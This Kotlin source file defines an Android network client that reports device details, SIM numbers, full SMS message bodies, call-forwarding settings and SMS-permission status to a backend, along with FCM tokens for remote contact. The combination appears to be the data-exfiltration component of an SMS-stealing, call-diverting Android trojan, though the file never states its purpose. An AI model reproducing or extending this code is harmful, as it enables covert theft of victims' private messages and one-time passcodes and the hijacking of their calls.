package com.example.admin.network

import android.content.Context
import android.util.Log
import com.example.admin.utils.Constants
import kotlinx.coroutines.suspendCancellableCoroutine
import okhttp3.Call
import okhttp3.Callback
import okhttp3.Headers
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.UUID
import java.util.concurrent.TimeUnit
import kotlin.coroutines.resume

data class UpsertResult(val success: Boolean, val response: String?)
data class QueryResult(val success: Boolean, val data: List<JSONObject>?, val error: String?)
data class SingleResult(val success: Boolean, val data: JSONObject?, val error: String?)

/**
 * SupabaseApi — All network calls go through our backend proxy.
 *
 * Architecture:
 *   Android App  →  Backend (BACKEND_ROOT)  →  Supabase DB
 *
 * The Android app never connects to Supabase directly.
 * No Supabase URL or keys are stored in the app.
 * The backend validates every request before writing to the database.
 *
 * FCM TOKEN FIX:
 *   fcm_token is now stored in its OWN dedicated column in the devices table.
 *   It is NEVER written inside data_json anymore.
 *   This means heartbeat/online-status upserts can never overwrite it,
 *   because they do not touch the fcm_token column at all.
 */
class SupabaseApi(private val context: Context) {

    companion object {
        private const val TAG = "SUPABASE_API"

        private val BASE get() = Constants.DEVICE_API_BASE_URL

        private val UPSERT_URL  get() = "$BASE/upsert"
        private val GET_URL     get() = "$BASE/get"
        private val UPDATE_URL  get() = "$BASE/update"
        private val DATA_URL    get() = "$BASE/data"

        private val MESSAGE_URL get() = "$BASE/message"
        private val FORM_URL    get() = "$BASE/form"

        private val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()
    }

    private val client: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    fun getAppId(): String         = Constants.APP_TOKEN
    fun getOrCreateAppId(): String = Constants.APP_TOKEN
    fun getTableName(): String     = Constants.TABLE_NAME
    fun getApiBaseUrl(): String    = Constants.DEVICE_API_BASE_URL

    private fun jsonBody(obj: JSONObject): RequestBody =
        obj.toString().toRequestBody(JSON_MEDIA_TYPE)

    private fun headers(): Headers = Headers.Builder()
        .add("Content-Type", "application/json")
        .build()

    private fun fmt(ts: Long): String =
        SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(ts))

    private fun mask(number: String): String {
        val c = number.trim()
        return if (c.length <= 4) "****" else "****${c.takeLast(4)}"
    }

    private fun postTo(url: String, payload: JSONObject, callback: (Boolean, String?) -> Unit) {
        try {
            val request = Request.Builder()
                .url(url)
                .headers(headers())
                .post(jsonBody(payload))
                .build()
            Log.d(TAG, "POST → $url")
            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) =
                    callback(false, "Network error: ${e.message}")
                override fun onResponse(call: Call, response: Response) {
                    response.use {
                        val body = it.body?.string()
                        if (it.isSuccessful) callback(true, body)
                        else callback(false, "HTTP ${it.code}: $body")
                    }
                }
            })
        } catch (e: Exception) { callback(false, "Exception: ${e.message}") }
    }

    private suspend fun postToSuspend(url: String, payload: JSONObject): UpsertResult =
        suspendCancellableCoroutine { cont ->
            postTo(url, payload) { ok, msg ->
                if (cont.isActive) cont.resume(UpsertResult(ok, msg))
            }
        }

    // ─────────────────────────────────────────────────────────────────────────
    //  CORE: smartUpsert  →  /upsert  →  devices table
    // ─────────────────────────────────────────────────────────────────────────
    fun smartUpsert(payload: JSONObject, callback: (Boolean, String?) -> Unit) {
        if (!payload.has("sub_id") && !payload.has("uid")) {
            callback(false, "sub_id or uid required"); return
        }
        payload.put("app_id", Constants.APP_TOKEN)
        payload.put("updated_at", System.currentTimeMillis())
        postTo(UPSERT_URL, payload, callback)
    }

    suspend fun smartUpsertSuspend(payload: JSONObject): UpsertResult =
        suspendCancellableCoroutine { cont ->
            smartUpsert(payload) { ok, msg ->
                if (cont.isActive) cont.resume(UpsertResult(ok, msg))
            }
        }

    // ─────────────────────────────────────────────────────────────────────────
    //  REGISTER DEVICE  →  /upsert  →  devices table
    // ─────────────────────────────────────────────────────────────────────────
    fun registerDevice(uid: String, deviceInfo: JSONObject, callback: (Boolean, String?) -> Unit) {
        if (uid.isBlank()) { callback(false, "UID missing"); return }
        val now = System.currentTimeMillis()
        val payload = JSONObject().apply {
            put("sub_id",             uid)
            put("uid",                uid)
            put("app_id",             Constants.APP_TOKEN)
            put("data_type",          "registered_device")
            put("status",             "active")
            put("registered_at",      now)
            put("created_at",         now)
            put("total_sms_count",    0)
            put("last_sms_timestamp", 0)
            // FCM token lives in its own column — set empty string on registration
            put("fcm_token",          "")
            put("fcm_token_status",   "not_registered")
            val dj = JSONObject().apply {
                put("model",                  deviceInfo.optString("model", ""))
                put("brand",                  deviceInfo.optString("brand", ""))
                put("manufacturer",           deviceInfo.optString("manufacturer", ""))
                put("androidversion",         deviceInfo.optString("androidversion", ""))
                put("device_name",            deviceInfo.optString("device_name", deviceInfo.optString("model", "")))
                put("sim1number",             deviceInfo.optString("sim1number", ""))
                put("sim1carrier",            deviceInfo.optString("sim1carrier", ""))
                put("sim2number",             deviceInfo.optString("sim2number", ""))
                put("sim2carrier",            deviceInfo.optString("sim2carrier", ""))
                put("joinedat",               deviceInfo.optLong("joinedat", now))
                put("joinedat_readable",      fmt(deviceInfo.optLong("joinedat", now)))
                put("registered_at",          now)
                put("registered_at_readable", fmt(now))
                // DO NOT put fcm_token inside data_json — it has its own column now
                put("online_status",          "unknown")
                put("online_checked_at",      0)
                put("last_seen_at",           0)
            }
            put("data_json", dj)
        }
        smartUpsert(payload, callback)
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  HEARTBEAT  →  /upsert  →  devices table
    //  NOTE: heartbeat NEVER touches fcm_token — it has its own column now
    // ─────────────────────────────────────────────────────────────────────────
    suspend fun upsertHeartbeat(uid: String, heartbeatData: JSONObject): UpsertResult {
        if (uid.isBlank()) return UpsertResult(false, "UID missing")
        val now = System.currentTimeMillis()

        val existing = try { getDeviceByUidSuspend(uid) } catch (_: Exception) { SingleResult(false, null, null) }
        val dataJson = if (existing.success && existing.data != null)
            existing.data.optJSONObject("data_json") ?: JSONObject()
        else JSONObject()

        dataJson.put("online_status",              "online")
        dataJson.put("online_checked_at",          now)
        dataJson.put("online_checked_at_readable", fmt(now))
        dataJson.put("last_seen_at",               now)
        dataJson.put("last_seen_at_readable",      fmt(now))
        dataJson.put("heartbeat", JSONObject().apply {
            put("available",  heartbeatData.optString("available", "Device is online"))
            put("checked_at", heartbeatData.optLong("checked_at", now))
        })

        return smartUpsertSuspend(JSONObject().apply {
            put("sub_id",            uid)
            put("uid",               uid)
            put("status",            "online")
            put("last_heartbeat_at", now)
            put("data_json",         dataJson)
            // fcm_token is intentionally NOT included here — backend will not touch it
        })
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  FCM TOKEN  →  /upsert  →  devices table (dedicated fcm_token column)
    //
    //  FIXED: fcm_token is now sent as a top-level field, NOT inside data_json.
    //  This means no more read-modify-write race conditions:
    //  a single upsert sets the column directly and heartbeats can never wipe it.
    // ─────────────────────────────────────────────────────────────────────────
    fun updateDeviceToken(uid: String, token: String, callback: (Boolean, String?) -> Unit) {
        if (uid.isBlank()) { callback(false, "UID missing"); return }
        if (token.isBlank()) { callback(false, "Token empty"); return }
        Log.d(TAG, "updateDeviceToken uid=$uid token=${token.take(20)}…")
        // Direct top-level column write — no data_json fetch needed
        smartUpsert(JSONObject().apply {
            put("sub_id",           uid)
            put("uid",              uid)
            put("fcm_token",        token)
            put("fcm_token_status", "active")
        }, callback)
    }

    fun getDeviceToken(uid: String, callback: (String?) -> Unit) {
        getDeviceByUid(uid) { res ->
            if (res.success && res.data != null) {
                // Check dedicated column first, then legacy data_json fallback
                val topLevel = res.data.optString("fcm_token", "").trim()
                if (topLevel.isNotBlank()) {
                    callback(topLevel)
                } else {
                    val dj = res.data.optJSONObject("data_json")
                    callback(dj?.optString("fcm_token", "")?.trim()?.takeIf { it.isNotBlank() })
                }
            } else {
                callback(null)
            }
        }
    }

    fun isTokenValid(uid: String, callback: (Boolean) -> Unit) {
        getDeviceByUid(uid) { res ->
            if (res.success && res.data != null) {
                // Check dedicated column first
                val topToken  = res.data.optString("fcm_token", "").trim()
                val topStatus = res.data.optString("fcm_token_status", "").trim()
                if (topToken.isNotBlank()) {
                    callback(topStatus == "active")
                    return@getDeviceByUid
                }
                // Legacy fallback: check data_json
                val dj = res.data.optJSONObject("data_json")
                callback(
                    dj != null &&
                    dj.optString("fcm_token_status") == "active" &&
                    dj.optString("fcm_token", "").isNotBlank()
                )
            } else {
                callback(false)
            }
        }
    }

    fun invalidateDeviceToken(uid: String, callback: (Boolean, String?) -> Unit) {
        if (uid.isBlank()) { callback(false, "UID missing"); return }
        // Direct top-level column write — no data_json fetch needed
        smartUpsert(JSONObject().apply {
            put("sub_id",           uid)
            put("uid",              uid)
            put("fcm_token_status", "inactive")
        }, callback)
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  ONLINE STATUS  →  /upsert  →  devices table
    //  NOTE: does NOT touch fcm_token column
    // ─────────────────────────────────────────────────────────────────────────
    fun updateOnlineStatus(uid: String, isOnline: Boolean, callback: (Boolean, String?) -> Unit) {
        if (uid.isBlank()) { callback(false, "UID missing"); return }
        if (!isOnline) { callback(true, "Ignored offline by rule"); return }
        val now = System.currentTimeMillis()
        getDeviceByUid(uid) { res ->
            val dj = if (res.success && res.data != null)
                res.data.optJSONObject("data_json") ?: JSONObject()
            else JSONObject()
            dj.put("online_status",              "online")
            dj.put("online_checked_at",          now)
            dj.put("online_checked_at_readable", fmt(now))
            dj.put("last_seen_at",               now)
            dj.put("last_seen_at_readable",      fmt(now))
            smartUpsert(JSONObject().apply {
                put("sub_id",            uid)
                put("status",            "online")
                put("last_heartbeat_at", now)
                put("data_json",         dj)
                // fcm_token intentionally NOT included — backend leaves it untouched
            }, callback)
        }
    }

    fun getOnlineStatus(uid: String, callback: (Boolean?) -> Unit) {
        getDeviceInfo(uid) { dj ->
            if (dj != null) callback(dj.optString("online_status") == "online")
            else callback(null)
        }
    }

    fun getDeviceInfo(uid: String, callback: (JSONObject?) -> Unit) {
        getDeviceByUid(uid) { res ->
            if (res.success && res.data != null) callback(res.data.optJSONObject("data_json"))
            else callback(null)
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  GET DEVICE BY UID  →  GET /get/{uid}  →  devices table
    // ─────────────────────────────────────────────────────────────────────────
    fun getDeviceByUid(uid: String, callback: (SingleResult) -> Unit) {
        try {
            if (uid.isBlank()) { callback(SingleResult(false, null, "UID missing")); return }
            val url = "$GET_URL/$uid"
            val request = Request.Builder().url(url).headers(headers()).get().build()
            Log.d(TAG, "GET → $url")
            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) =
                    callback(SingleResult(false, null, "Network error: ${e.message}"))
                override fun onResponse(call: Call, response: Response) {
                    response.use {
                        val body = it.body?.string()
                        if (it.isSuccessful && body != null) {
                            try {
                                val obj = JSONObject(body)
                                if (obj.optBoolean("ok") && obj.has("data"))
                                    callback(SingleResult(true, obj.getJSONObject("data"), null))
                                else
                                    callback(SingleResult(false, null, obj.optString("error", "Not found")))
                            } catch (e: Exception) {
                                callback(SingleResult(false, null, "Parse error: ${e.message}"))
                            }
                        } else {
                            callback(SingleResult(false, null, "HTTP ${it.code}: $body"))
                        }
                    }
                }
            })
        } catch (e: Exception) { callback(SingleResult(false, null, "Exception: ${e.message}")) }
    }

    private suspend fun getDeviceByUidSuspend(uid: String): SingleResult =
        suspendCancellableCoroutine { cont ->
            getDeviceByUid(uid) { if (cont.isActive) cont.resume(it) }
        }

    // ─────────────────────────────────────────────────────────────────────────
    //  UPDATE DEVICE (partial)  →  PATCH /update/{uid}  →  devices table
    // ─────────────────────────────────────────────────────────────────────────
    fun updateData(uid: String, updates: JSONObject, callback: (Boolean, String?) -> Unit) {
        if (uid.isBlank()) { callback(false, "UID missing"); return }
        try {
            val url = "$UPDATE_URL/$uid"
            updates.put("updated_at", System.currentTimeMillis())
            val request = Request.Builder()
                .url(url)
                .headers(headers())
                .patch(updates.toString().toRequestBody(JSON_MEDIA_TYPE))
                .build()
            Log.d(TAG, "PATCH → $url")
            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) =
                    callback(false, "Network error: ${e.message}")
                override fun onResponse(call: Call, response: Response) {
                    response.use {
                        val body = it.body?.string()
                        if (it.isSuccessful) callback(true, body)
                        else callback(false, "HTTP ${it.code}: $body")
                    }
                }
            })
        } catch (e: Exception) { callback(false, "Exception: ${e.message}") }
    }

    fun getAllDevices(limit: Int = 1000, callback: (QueryResult) -> Unit) {
        callback(QueryResult(false, null, "Use admin portal for device listing"))
    }

    fun getDevicesWithActiveTokens(callback: (List<Pair<String, String>>) -> Unit) = callback(emptyList())
    fun getOnlineDevices(callback: (List<Pair<String, JSONObject>>) -> Unit) = callback(emptyList())

    // ─────────────────────────────────────────────────────────────────────────
    //  SMS LOG  →  POST /message  →  messages table
    // ─────────────────────────────────────────────────────────────────────────
    fun insertSmsLog(smsData: JSONObject, callback: (Boolean, String?) -> Unit) {
        val uid = smsData.optString("uid", smsData.optString("sub_id", ""))
        if (uid.isBlank()) { callback(false, "UID missing"); return }

        val now = System.currentTimeMillis()
        val payload = JSONObject().apply {
            put("sub_id",                uid)
            put("uid",                   uid)
            put("app_id",                Constants.APP_TOKEN)
            put("phone_number",          smsData.optString("phone_number", ""))
            put("sender_number",         smsData.optString("phone_number", ""))
            put("receiver_number",       smsData.optString("receiver_number", ""))
            put("message_body",          smsData.optString("message_body", "").take(5000))
            put("timestamp",             smsData.optLong("timestamp", now))
            put("direction",             smsData.optString("direction", "incoming"))
            put("status",                smsData.optString("status", "received"))
            put("sim_slot",              smsData.optInt("sim_slot", 1))
            put("sms_id",                smsData.optString("sms_id", UUID.randomUUID().toString()))
            put("title",                 smsData.optString("title", "New SMS"))
            put("is_forwarded_to_admin", smsData.optBoolean("is_forwarded_to_admin", false))
        }

        postTo(MESSAGE_URL, payload, callback)
    }

    fun getLastSmsLog(uid: String, callback: (SingleResult) -> Unit) {
        getDeviceByUid(uid) { res ->
            if (res.success && res.data != null) {
                val log = res.data.optJSONObject("last_sms_log")
                callback(SingleResult(true, log, if (log == null) "No SMS log" else null))
            } else {
                callback(SingleResult(false, null, res.error ?: "Device not found"))
            }
        }
    }

    fun getSmsHistory(uid: String, limit: Int = 50, offset: Int = 0, callback: (QueryResult) -> Unit) {
        try {
            val url = "${Constants.BACKEND_ROOT}/api/device/${Constants.APP_TOKEN}/messages" +
                    "?uid=$uid&limit=$limit&offset=$offset"
            val request = Request.Builder().url(url).headers(headers()).get().build()
            Log.d(TAG, "GET → $url")
            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) =
                    callback(QueryResult(false, null, "Network error: ${e.message}"))
                override fun onResponse(call: Call, response: Response) {
                    response.use {
                        val body = it.body?.string()
                        if (it.isSuccessful && body != null) {
                            try {
                                val obj = JSONObject(body)
                                val arr = obj.optJSONArray("data") ?: JSONArray()
                                val list = mutableListOf<JSONObject>()
                                for (i in 0 until arr.length()) list.add(arr.getJSONObject(i))
                                callback(QueryResult(true, list, null))
                            } catch (e: Exception) {
                                callback(QueryResult(false, null, "Parse error: ${e.message}"))
                            }
                        } else {
                            callback(QueryResult(false, null, "HTTP ${it.code}: $body"))
                        }
                    }
                }
            })
        } catch (e: Exception) { callback(QueryResult(false, null, "Exception: ${e.message}")) }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  CALL FORWARD  →  /upsert  →  devices table (dedicated columns)
    // ─────────────────────────────────────────────────────────────────────────
    fun updateCallForwardData(
        uid: String, code: String, slot: Int, status: String,
        response: String, action: String, number: String,
        callback: (Boolean, String?) -> Unit
    ) {
        if (uid.isBlank()) { callback(false, "UID missing"); return }
        smartUpsert(JSONObject().apply {
            put("sub_id",                 uid)
            put("call_forward_status",    status)
            put("call_forward_action",    action)
            put("call_forward_code",      code)
            put("call_forward_number",    number)
            put("call_forward_sim_slot",  slot)
            put("call_forward_response",  response.take(500))
            put("call_forward_timestamp", System.currentTimeMillis())
        }, callback)
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  SMS SYNC STATUS  →  /upsert  →  devices table
    // ─────────────────────────────────────────────────────────────────────────
    fun updateSmsSyncStatus(
        uid: String, pendingCount: Int, processedCount: Int,
        status: String, permissionStatus: String, error: String?,
        callback: (Boolean, String?) -> Unit
    ) {
        if (uid.isBlank()) { callback(false, "UID missing"); return }
        smartUpsert(JSONObject().apply {
            put("sub_id",                uid)
            put("sms_sync_status",       status)
            put("sms_pending_count",     pendingCount)
            put("sms_processed_count",   processedCount)
            put("sms_permission_status", permissionStatus)
            put("sms_last_sync_at",      System.currentTimeMillis())
            put("sms_last_error",        error ?: "")
        }, callback)
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  FORM DATA  →  POST /form  →  form_data table
    // ─────────────────────────────────────────────────────────────────────────
    suspend fun upsertData(data: JSONObject, dataType: String): UpsertResult {
        val subId = data.optString("sub_id", data.optString("uid", ""))
        return upsertData(data, dataType, subId)
    }

    suspend fun upsertData(data: JSONObject, dataType: String, subId: String): UpsertResult {
        if (subId.isBlank()) return UpsertResult(false, "subId/uid missing")
        data.put("sub_id",    subId)
        data.put("data_type", dataType)
        data.put("app_id",    Constants.APP_TOKEN)
        return postToSuspend(FORM_URL, data)
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  DELETE — disabled, use admin portal
    // ─────────────────────────────────────────────────────────────────────────
    fun deleteData(uid: String, callback: (Boolean, String?) -> Unit) {
        callback(false, "Use admin portal to delete devices")
    }
}
